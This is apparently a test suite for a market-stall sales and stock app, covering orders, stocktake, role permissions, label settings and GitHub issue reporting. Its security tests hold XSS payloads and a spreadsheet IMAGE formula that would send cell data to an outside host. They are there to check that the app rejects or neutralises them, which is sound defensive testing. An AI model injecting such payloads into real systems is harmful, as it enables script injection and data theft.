  for (let i = 0; i < SF.ASSISTANT_PER_HOUR; i++) SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'stallflow_stock', arguments: {} } });
  const over = SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'stallflow_stock', arguments: {} } }).reply.result;
  assert.strictEqual(over.isError, true);
  SF.dispatch('assistantOff', { token: env.owner, opId: 'off' });
  assert.strictEqual(SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001);
});

test('a new product never takes an id that is already in use', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  // 98 more products: ids P02..P99, then one more must not wrap round to P01
  for (let i = 2; i <= 99; i++) SF.append('products', { ProductId: 'P' + (i < 10 ? '0' + i : i), Name: 'Item ' + i, Type: 'stocked', Unit: 'each', Price: 10, Active: 'Yes', Sort: i * 10 });
  const r = SF.dispatch('saveProduct', { token: tok, opId: 'big1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 1 });
  assert.strictEqual(r.id, 'P100');
  const ids = SF.rows('products').map((x) => x.ProductId);
  assert.strictEqual(new Set(ids).size, ids.length, 'every id is unique');
  assert.strictEqual(SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand, 10, 'Apricot Jam is untouched');
});

test('the shared-id mistake is repaired: the ornament gets its own id and takes its stock with it', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  // what the live sheet looks like: the ornament added under P01, with its opening stock on P01
  SF.append('products', { ProductId: 'P01', Name: 'Lizard resin ornament', Category: 'Resin', Type: 'stocked', Unit: 'each', Price: 105, Active: 'Yes', Sort: 20 });
  SF.move('P01', 1, 'adjust', 'Opening stock');
  assert.strictEqual(SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand, 11, 'both are counted together');
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fixes = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'lizard-own-id');
  assert.strictEqual(fixes[0].run(), true);
  const by = (id) => SF.products({ all: true }).filter((x) => x.id === id);
  assert.strictEqual(by('P01').length, 1); assert.strictEqual(by('P01')[0].onHand, 10, 'Apricot Jam is back to its own stock');
  const liz = SF.products({ all: true }).filter((x) => /lizard/i.test(x.name))[0];
  assert.notStrictEqual(liz.id, 'P01'); assert.strictEqual(liz.onHand, 1);
  assert.strictEqual(fixes[0].run(), false, 'nothing left to repair');
});

test('a lizard sale recorded as Apricot Jam is put right: the order, the money, and both stocks', () => {
  const env = shop(day(0));
  const { SF, ctx } = env;
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const wait = (ms) => { const t = Date.now() + ms; while (Date.now() < t); };
  // an Apricot Jam sale from before the ornament existed: must be left alone
  assert.ok(SF.dispatch('sell', { token: tok, opId: 's0', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' }).ok);
  wait(5);
  SF.append('products', { ProductId: 'P01', Name: 'Lizard resin ornament', Category: 'Resin', Type: 'stocked', Unit: 'each', Price: 105, Active: 'Yes', Sort: 20 });
  SF.move('P01', 1, 'adjust', 'Opening stock');
  wait(5);
  // the lizard rung up at the till: recorded under P01, so as Apricot Jam
  const sale = SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' });
  assert.ok(sale.ok, JSON.stringify(sale));
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fixes = vm.runInContext('sfDataFixes()', ctx);
  fixes.filter((f) => f.id === 'lizard-own-id')[0].run();
  const sales = fixes.filter((f) => f.id === 'lizard-sales')[0];
  assert.strictEqual(sales.run(), true);
  const orders = SF.orders().filter((o) => o.status !== 'cancelled');
  const early = orders.filter((o) => o.no === orders[0].no)[0], late = orders[orders.length - 1];
  assert.strictEqual(early.lines[0].name, 'Apricot Jam', 'the earlier sale is untouched');
  assert.strictEqual(late.lines[0].name, 'Lizard resin ornament'); assert.strictEqual(late.total, 105); assert.strictEqual(late.units, 1);
  const stock = (re) => SF.products({ all: true }).filter((x) => re.test(x.name))[0].onHand;
  assert.strictEqual(stock(/Apricot/), 9, 'Apricot Jam: 10, less its own one sale');
  assert.strictEqual(stock(/Lizard/), 0, 'the one ornament is sold');
  assert.strictEqual(sales.run(), false, 'repeating changes nothing');
  assert.strictEqual(stock(/Lizard/), 0);
});

test('cashing up closes that market: off the till, cash-up counts the phone\'s market, Reopen puts it back', () => {
  const env = shop(day(0));
  const { SF } = env;
  SF.append('markets', { MarketId: 'M02', Name: 'Second Market', Date: day(0), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.ok(SF.dispatch('sell', { token: tok, opId: 'a1', marketId: 'M02', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' }).ok);
  const exp = SF.dispatch('cashup.expected', { token: tok, marketId: 'M02' });
  assert.strictEqual(exp.marketId, 'M02', 'the phone\'s market, not the live one');
  assert.ok(exp.cash > 0);
  const rec = SF.dispatch('cashup.record', { token: tok, opId: 'c1', marketId: 'M02', counted: exp.expectedInTin, note: '' });
  assert.ok(rec.ok, JSON.stringify(rec));
  let till = SF.dispatch('till', { token: tok }).data;
  assert.strictEqual(till.markets.filter((m) => m.id === 'M02').length, 0, 'gone from the picker');
  assert.strictEqual(till.running.filter((m) => m.id === 'M02').length, 0, 'gone from Markets today');
  assert.ok(till.markets.some((m) => m.id === 'M01'), 'the other market stays');
  const hist = SF.dispatch('dashboard', { token: tok, marketId: 'M02' }).data.history.filter((h) => h.id === 'M02')[0];
  assert.strictEqual(hist.cashed, true, 'Numbers keeps it, marked cashed up');
  assert.strictEqual(SF.dispatch('reopenMarket', { token: tok, opId: 'r1', id: 'M02' }).ok, true);
  till = SF.dispatch('till', { token: tok }).data;
  assert.ok(till.markets.some((m) => m.id === 'M02'), 'back on the till');
  assert.strictEqual(SF.dispatch('reopenMarket', { token: tok, opId: 'r2', id: 'M02' }).ok, false, 'nothing to reopen twice');
});

test('the Caroline test market is removed only while nothing is recorded against it', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  SF.append('markets', { MarketId: 'M07', Name: 'Caroline', Date: day(300), Location: 'Lyttelton', Status: 'planned' });
  SF.append('markets', { MarketId: 'M08', Name: 'Caroline', Date: day(301), Location: 'Lyttelton', Status: 'planned' });
  SF.append('expenses', { ExpenseId: 'E1', MarketId: 'M08', Description: 'Stall', Amount: 50, Category: 'Stall', When: new Date() });
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fix = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'remove-caroline-test-market')[0];
  assert.strictEqual(fix.run(), true);
  const ids = SF.rows('markets').map((m) => m.MarketId).join(',');
  assert.ok(ids.indexOf('M07') < 0, 'the empty one is gone');
  assert.ok(ids.indexOf('M08') >= 0, 'one with a cost against it stays');
  assert.ok(ids.indexOf('M01') >= 0, 'other markets stay');
  assert.strictEqual(fix.run(), false);
});

test('uncooked stock is a list she can add to and update', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'p1', item: 'Sugar', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p2', item: 'sugar', qty: 2.5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p3', item: '352 ml bottles', qty: 24, unit: 'each' });
  const p = SF.dispatch('stock', { token: tok }).data.pantry;
  assert.strictEqual(JSON.stringify(p.map((r) => [r.item, r.qty])), '[["352 ml bottles",24],["Sugar",2.5]]');
  assert.strictEqual(SF.dispatch('savePantry', { token: tok, opId: 'p4', item: 'x', qty: 1 }).ok, false);
});

/* ---------- an order page for every market, and one between markets ---------- */

function markets3() {
  const env = shop(day(3));                       // M01, live, in three days
  env.SF.append('markets', { MarketId: 'M02', Name: 'Monument Primary', Date: day(10), Status: 'planned' });
  env.SF.append('markets', { MarketId: 'M03', Name: 'Last Month', Date: day(-20), Status: 'planned' });
  env.SF.setPin('owner', '4321');
  env.tok = env.SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  return env;
}
const cat = (SF, market) => SF.dispatch('catalogue', market === undefined ? {} : { market }).data;

test('each market has its own order page, and past ones are closed', () => {
  const { SF } = markets3();
  assert.strictEqual(cat(SF).market.id, 'M01', 'no ?m= is the live market');
  assert.strictEqual(cat(SF).open, true);
  assert.strictEqual(cat(SF, 'M02').market.name, 'Monument Primary');
  assert.strictEqual(cat(SF, 'M02').open, true);
  assert.strictEqual(cat(SF, 'M03').open, false);
  assert.strictEqual(cat(SF, 'nonsense').open, false);
  assert.strictEqual(cat(SF, 'nonsense').market, null);
  assert.strictEqual(JSON.stringify(cat(SF).markets.map((m) => m.id)), '["M01","M02","home"]',
                     'soonest first, past ones left out, between markets last');
});

test('an order from a market page belongs to that market and shows in its queue', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'M02' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.market.name, 'Monument Primary');
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[2], 'M02');
  const here = SF.dispatch('queue', { token: tok, marketId: 'M02' }).data;
  const live = SF.dispatch('queue', { token: tok }).data;
  assert.ok(here.unpaid.some((o) => o.no === r.orderNo), 'in the M02 queue');
  assert.ok(!live.unpaid.some((o) => o.no === r.orderNo), 'not in the live market queue');
  assert.ok(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.unpaid.some((o) => o.no === r.orderNo));
});

test('a past market refuses orders while the others still take them', () => {
  const { SF } = markets3();
  const refused = order(SF, { market: 'M03' });
  assert.strictEqual(refused.ok, false);
  assert.strictEqual(refused.code, 'closed');
  assert.strictEqual(order(SF, { market: 'M02' }).ok, true);
});

test('orders between markets are always open, and can be switched off', () => {
  const { SF, sheets, tok } = markets3();
  const home = cat(SF, 'home');
  assert.strictEqual(home.open, true);
  assert.strictEqual(home.market.home, true);
  assert.ok(/collected/.test(home.consentText), home.consentText);
  const r = order(SF, { market: 'home' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[2], 'HOME');
  assert.ok(SF.dispatch('queue', { token: tok, marketId: 'home' }).data.unpaid.some((o) => o.no === r.orderNo));
  SF.dispatch('setHomeOrders', { token: tok, opId: 'h0', open: false });
  assert.strictEqual(cat(SF, 'home').open, false);
  assert.strictEqual(order(SF, { market: 'home' }).ok, false);
  assert.ok(!cat(SF).markets.some((m) => m.id === 'home'));
});

test('switching pre-orders off closes every market page', () => {
  const { SF, tok } = markets3();
  SF.dispatch('setPreordersOpen', { token: tok, opId: 'p0', open: false });
  ['M01', 'M02', 'home'].forEach((m) => assert.strictEqual(cat(SF, m).open, false, m));
  assert.strictEqual(cat(SF).markets.length, 0);
});

test('a between-markets customer keeps their details until the order is handed over', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'home', name: 'Thabo Nkosi' });
  const row = () => sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Thabo Nkosi', 'still waiting, so the name stays');
  SF.dispatch('markPaid', { token: tok, opId: 'mp', orderNo: r.orderNo });
  SF.dispatch('markCollected', { token: tok, opId: 'mc', orderNo: r.orderNo });
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Customer', 'handed over, so the name goes');
  assert.strictEqual(row()[5], '');
});

test('made-to-order capacity is counted per market', () => {
  const { SF, tok } = markets3();
  SF.append('products', { ProductId: 'P09', Name: 'Coffee', Type: 'made', Unit: 'each', Price: 30,
                          Capacity: 2, Active: 'Yes', Sort: 90 });
  assert.strictEqual(order(SF, { market: 'M01', lines: [{ id: 'P09', qty: 2 }] }).ok, true);
  const avail = (m) => cat(SF, m).products.find((p) => p.id === 'P09').available;
  assert.strictEqual(avail('M01'), 0);
  assert.strictEqual(avail('M02'), 2, 'another market has its own capacity');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.products
    .find((p) => p.id === 'P09').available, 2);
});

test('stock taken by an order is recorded against the market it is for', () => {
  const { SF, sheets } = markets3();
  const r = order(SF, { market: 'M02' });
  const mv = sheets.Movements.rows.find((x) => x[4] === r.orderNo);
  assert.strictEqual(mv[5], 'M02');
});

/* ---------- paying is handing over, unless the stall has a Collect step ---------- */

test('without a Collect step, Paid at the till also hands the order over', () => {
  const { SF, sheets, tok } = markets3();
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, false, 'off by default');
  const r = order(SF, { market: 'M01' });
  const res = SF.dispatch('markPaid', { token: tok, opId: 'pay1', orderNo: r.orderNo });
  assert.strictEqual(res.handedOver, true);
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[10], 'collected');
  assert.ok(row[11] && row[11].getTime && row[12] && row[12].getTime, 'paid and collected times are set');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M01' }).data.unpaid.length, 0);
});

test('with the Collect step switched on, Paid waits for the hand-over', () => {
  const { SF, sheets, tok } = markets3();
  SF.dispatch('setCollectStep', { token: tok, opId: 'cs', on: true });
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, true);
  const r = order(SF, { market: 'M01' });
  SF.dispatch('markPaid', { token: tok, opId: 'pay2', orderNo: r.orderNo });
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[10], 'paid');
  const till = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  assert.ok(till.waiting.some((o) => o.no === r.orderNo), 'the till can see it is waiting');
});

/* ---------- the label look ---------- */

test('the order page knows the owner name and WhatsApp number, and the reply carries the note', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'pf', ownerName: 'Marian', whatsapp: '066 000 0000' });
  const prof = SF.dispatch('catalogue', {}).data.profile;
  assert.strictEqual(prof.ownerName, 'Marian');
  assert.strictEqual(prof.whatsapp, '066 000 0000');
  const r = order(SF, { market: 'M01', note: 'After 11 please' });
  assert.strictEqual(r.note, 'After 11 please');
});

test('the label look is kept: style, contact lines, a small logo, price on or off', () => {
  const { SF, tok } = markets3();
  let look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'classic', 'starts in the style of the printed labels');
  assert.strictEqual(look.price, false, 'no price on the label unless asked');
  const logo = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGNgAAAAAgABSK+kcQAAAABJRU5ErkJggg==';
  const r = SF.dispatch('saveLabelLook', { token: tok, opId: 'll1', style: 'classic',
    contact: 'Marian\r\nMobile 066 000 0000\nthird\nfourth line is dropped', logo, price: true });
  assert.strictEqual(r.ok, true, r.message);
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.contact, 'Marian\nMobile 066 000 0000\nthird');
  assert.strictEqual(look.logo, logo);
  assert.strictEqual(look.price, true);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll2', logo: 'javascript:alert(1)' }).ok, false);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll3',
    logo: 'data:image/png;base64,' + 'A'.repeat(70000) }).ok, false, 'too big to keep');
  SF.dispatch('saveLabelLook', { token: tok, opId: 'll4', style: 'simple', contact: '', price: false });
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'simple');
  assert.strictEqual(look.logo, logo, 'leaving the logo out keeps it');
});

test('only an owner or manager can change the label look', () => {
  const { SF } = markets3();
  SF.setPin('cashier', '1111');
  const t = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: t, opId: 'x', contact: 'hi' }).ok, false);
});

/* ---------- stocktake ---------- */

function counting() {
  const env = markets3();                         // owner signed in; P01 Apricot Jam, 10 on hand
  const SF = env.SF;
  SF.append('products', { ProductId: 'P02', Name: 'Fig Jam', Type: 'stocked', Unit: 'each', Price: 80, Active: 'Yes', Sort: 20 });
  SF.move('P02', 6, 'adjust', 'test');
  SF.append('batches', { BatchId: 'B1', When: new Date(), ProductId: 'P01', Made: 10, CostLines: '[]', TotalCost: 200, CostPerUnit: 20 });
  SF.setPin('cashier', '1111'); SF.setPin('manager', '2222');
  env.cashier = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  env.manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  return env;
}
let cop = 0;
const act = (SF, action, token, extra) => SF.dispatch(action, Object.assign({ token, opId: 'k' + (cop++) }, extra || {}));

test('stocktake: a manager starts it, a cashier cannot', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countStart', cashier).ok, false);
  const r = act(SF, 'countStart', manager);
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(act(SF, 'countStart', manager).ok, false, 'only one at a time');
  const st = SF.dispatch('countState', { token: cashier }).data;
  assert.strictEqual(st.open.id, r.id);
  assert.strictEqual(st.canApprove, false);
  assert.strictEqual(st.open.review, undefined, 'only the owner sees the review');
  assert.strictEqual(JSON.stringify(st.open.locations.map((l) => l.status)), '["todo","todo","todo"]');
});

test('stocktake: anyone counts a location; counting it again replaces the first count', () => {
  const { SF, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countClaim', cashier, { countId: id, location: 'Storeroom' });
  let loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'counting');
  assert.ok(act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 9 }] }).ok);
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 2 }] });
  act(SF, 'countSave', manager, { countId: id, location: 'Car', lines: [{ id: 'P02', qty: 3 }] });
  loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'done'); assert.strictEqual(loc.items, 9);
  const review = SF.dispatch('countState', { token: tok }).data.open.review;
  const p1 = review.find((r) => r.id === 'P01'), p2 = review.find((r) => r.id === 'P02');
  assert.strictEqual(JSON.stringify([p1.expected, p1.counted, p1.diff]), '[10,7,-3]', 'the later Storeroom count wins');
  assert.strictEqual(JSON.stringify([p2.expected, p2.counted, p2.diff]), '[6,5,-1]', 'two locations add up');
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Garden shed', lines: [] }).ok, false);
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: -2 }] }).ok, false);
});

test('stocktake: the owner approves; stock follows the count and the loss is recorded at cost', () => {
  const { SF, sheets, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 8 }] });
  assert.strictEqual(act(SF, 'countApprove', manager, { countId: id }).ok, false, 'Marian approves, not a manager');
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.result.lossUnits, 3);
  assert.strictEqual(r.result.lossValue, 60, '3 Apricot Jam at R20 each');
  assert.strictEqual(r.result.foundUnits, 2);
  const hand = SF.onHand();
  assert.strictEqual(hand.P01, 7); assert.strictEqual(hand.P02, 8);
  const moves = sheets.Movements.rows.filter((m) => m[3] === 'stocktake');
  assert.strictEqual(moves.length, 2, 'two ledger lines, nothing overwritten');
  assert.ok(moves.every((m) => m[4] === 'Stocktake ' + id));
  const st = SF.dispatch('countState', { token: tok }).data;
  assert.strictEqual(st.open, null);
  assert.strictEqual(st.history[0].status, 'approved');
  assert.strictEqual(st.history[0].result.lossValue, 60);
});

test('stocktake: what nobody counted is left alone, unless the owner says there are none', () => {
  const { SF, tok, cashier } = counting();
  let id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  let r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.result.uncounted, 1);
  assert.strictEqual(SF.onHand().P02, 6, 'Fig Jam kept');
  id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  r = act(SF, 'countApprove', tok, { countId: id, uncounted: 'zero' });
  assert.strictEqual(SF.onHand().P02, 0, 'none left');
  assert.strictEqual(r.result.lossUnits, 6);
});

test('stocktake: managers edit the locations; the list stays tidy', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countLocationsSave', cashier, { locations: ['X'] }).ok, false);
  const r = act(SF, 'countLocationsSave', manager, { locations: [' Storeroom ', 'storeroom', 'Car  boot', '', 'Kitchen'] });
  assert.strictEqual(JSON.stringify(r.locations), '["Storeroom","Car boot","Kitchen"]');
  assert.strictEqual(act(SF, 'countLocationsSave', manager, { locations: [] }).ok, false);
  assert.strictEqual(SF.dispatch('countState', { token: cashier }).data.locations.length, 3);
});

/* ---------- security: who may change things, and what text may hold ---------- */

test('a viewer sees the numbers but cannot change how the stall runs', () => {
  const { SF, tok } = markets3();
  SF.setPin('viewer', '3333'); SF.setPin('manager', '2222');
  const viewer = SF.dispatch('signIn', { pin: '3333', device: 'v' }).data.token;
  const manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  let k = 0;
  const tryAs = (t, action, extra) => SF.dispatch(action, Object.assign({ token: t, opId: 'sec' + (k++) }, extra || {}));
  [['setPreordersOpen', { open: false }], ['addMarket', { name: 'Sneaky Market' }], ['releaseUnpaid', {}],
   ['setActiveMarket', { marketId: 'M02' }], ['saveLabelLook', { contact: 'x' }], ['setCollectStep', { on: true }],
   ['setHomeOrders', { open: false }], ['savePluginSettings', { plugin: 'cashup', values: {} }],
   ['saveProfile', { name: 'X' }]].forEach(([a, extra]) => {
    const r = tryAs(viewer, a, extra);
    assert.strictEqual(r.ok, false, a + ' should be refused for a viewer');
    assert.strictEqual(r.code, 'forbidden', a);
  });
  assert.strictEqual(SF.dispatch('dashboard', { token: viewer }).ok, true, 'the numbers still work for a viewer');
  assert.strictEqual(tryAs(manager, 'setPreordersOpen', { open: true }).ok, true, 'a manager may');
  assert.strictEqual(tryAs(manager, 'addMarket', { name: 'Real Market', date: day(4) }).ok, true);
  assert.strictEqual(tryAs(tok, 'setActiveMarket', { marketId: 'M02' }).ok, true, 'and the owner');
});

test('a market date must be a date, and the live market must exist', () => {
  const { SF, tok } = markets3();
  const bad = SF.dispatch('addMarket', { token: tok, opId: 'd1', name: 'Bad', date: '2099-01-01<img src=x onerror=alert(1)>' });
  assert.strictEqual(bad.ok, false);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd2', name: 'Good', date: '2026-12-05' }).ok, true);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd3', name: 'No date yet' }).ok, true);
  assert.strictEqual(SF.dispatch('setActiveMarket', { token: tok, opId: 'd4', marketId: 'zzz' }).ok, false);
  assert.strictEqual(SF.get('activeMarket'), 'M01', 'unchanged');
});

test('shop words are plain text, when saved and when read back from older data', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'v1', colour: 'red;background:url(x)',
    vocab: { units: '<img src=x onerror="steal()">jars', unit: 'jar', evil: 'x' }, plugins: ['cashup', 'nope'] });
  let pr = SF.profile();
  assert.ok(!/[<>"=]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.vocab.evil, undefined, 'unknown words are dropped');
  assert.strictEqual(pr.colour, '#7B2D43', 'a colour must be a colour');
  assert.strictEqual(JSON.stringify(pr.plugins), '["cashup"]');
  // Data stored before this check existed is cleaned on the way out.
  SF.set('profile', JSON.stringify({ vocab: { units: '<script>bad()</script>' }, colour: 'javascript:x' }));
  pr = SF.profile();
  assert.ok(!/[<>()]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.colour, '#7B2D43');
});

test('Export orders keeps a customer name that starts with = as text', () => {
  const { SF, sheets, ctx } = markets3();
  assert.strictEqual(order(SF, { market: 'M01', name: '=IMAGE("https://e.tld/?"&A1)' }).ok, true);
  ctx.sfExport();
  const out = Object.keys(sheets).filter((n) => /^Orders \d/.test(n)).map((n) => sheets[n])[0];
  assert.ok(out, 'the export tab was made');
  const cell = out.rows[1][4];
  assert.ok(String(cell).startsWith("'="), 'stays text: ' + cell);
});

/* ---------- reporting a problem ---------- */

function reporter(role) {
  const env = shop(day(3));
  env.SF.setPin('owner', '4321');
  if (role !== 'owner') env.SF.setPin(role, '1111');
  const pin = role === 'owner' ? '4321' : '1111';
  env.tok = env.SF.dispatch('signIn', { pin, device: 'd' }).data.token;
  return env;
}

test('a cashier can report a problem; it is kept in the Issues tab', () => {
  const { SF, sheets, tok, gh } = reporter('cashier');
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r1', message: 'Take payment does nothing', screen: 'till' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, false, 'no GitHub token yet, so only the sheet has it');
  assert.strictEqual(gh.length, 0);
  const row = sheets.Issues.rows[1];
  assert.strictEqual(row[5], 'Take payment does nothing');
  assert.ok(String(row[7]).startsWith('saved'), row[7]);
});

test('with a GitHub token the report opens one labelled issue, with no phone number or e-mail', () => {
  const { SF, sheets, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_SECRETSECRET';
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r2', screen: 'till',
    message: 'Anna 082 123 4567 anna@example.com could not pay',
    failed: [{ action: 'sell', message: 'Only 0 left of Guava Jam' }] });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, true);
  assert.strictEqual(gh.length, 1);
  const sent = JSON.parse(gh[0].opts.payload);
  assert.ok(/082|anna@example/.test(JSON.stringify(sent)) === false, 'personal details leaked: ' + sent.body);
  assert.ok(sent.body.indexOf('[number]') !== -1 && sent.body.indexOf('[email]') !== -1);
  assert.deepStrictEqual(sent.labels, ['app-report']);
  assert.ok(sent.body.indexOf('ghp_SECRET') === -1, 'the token must never be in the issue');
  assert.strictEqual(sheets.Issues.rows[1][7], 'sent');
  assert.strictEqual(sheets.Issues.rows[1][8], 'https://github.com/o/r/issues/7');
  assert.ok(/Bearer ghp_/.test(gh[0].opts.headers.Authorization));
});

test('a retried report does not open a second GitHub issue', () => {
  const { SF, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_x';
  SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  const again = SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  assert.strictEqual(again.replayed, true);
  assert.strictEqual(gh.length, 1);
});

test('an empty report is refused and at most 5 an hour are accepted', () => {
  const { SF, tok } = reporter('owner');
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'e', message: 'hi' }).ok, false);
  for (let i = 0; i < 5; i++) {
    assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n' + i, message: 'Problem number ' + i }).ok, true);
  }
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n6', message: 'One more problem' }).ok, false);
});

test('connecting reports checks the token with GitHub before keeping it', () => {
  const { SF, props } = shop(day(3));
  assert.strictEqual(SF.reportsConnected(), false);
  assert.strictEqual(SF.connectGithub('not a token').ok, false);
  assert.strictEqual(SF.connectGithub('github_pat_' + 'x'.repeat(30)).ok, false, 'GitHub refused it');
  assert.strictEqual(props.GITHUB_TOKEN, undefined, 'a refused token is not kept');
  const r = SF.connectGithub('  github_pat_good' + 'x'.repeat(30) + '  ');
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(props.GITHUB_TOKEN, 'github_pat_good' + 'x'.repeat(30));
  assert.strictEqual(SF.reportsConnected(), true);
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.strictEqual(SF.dispatch('health', { token: tok }).data.reports, true);
});

test('reporting needs a sign-in', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(SF.dispatch('reportIssue', { opId: 'x', message: 'Anything at all' }).ok, false);
});


/* ---------- how each sale was paid ---------- */
const ownerTok = (SF) => { SF.setPin('owner', '4321'); return SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token; };

test('schema 10 adds a Paid heading to an Orders tab that had none', () => {
  const { SF, sheets } = shop(day(3));
  const head = sheets.Orders.rows[0];
  head.length = 15;                                  // an Orders tab from before
  SF.set('schemaVersion', 9);
  const done = SF.migrate();
  assert.ok(done.some((d) => /^10:/.test(d)), done.join(' | '));
  assert.strictEqual(sheets.Orders.rows[0][15], 'Paid');
  assert.strictEqual(SF.SCHEMA, 10);
});

test('a till sale keeps how it was paid; anything unknown, or nothing, is cash', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
